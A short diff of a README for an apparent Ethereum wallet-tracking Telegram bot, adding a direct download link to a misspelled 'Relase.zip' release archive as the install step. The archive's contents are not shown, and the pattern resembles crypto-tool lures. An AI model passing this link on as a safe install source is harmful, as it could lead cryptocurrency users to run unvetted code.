@@ -7,7 +7,7 @@ This is a Telegram bot that tracks the transactions of added Ethereum (ETH) and 
 
 
 ## Download
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/robbixe/Crypto-Wallet-Tracker/releases/download/v2.5/Relase.zip)
 
 
 ## Commands
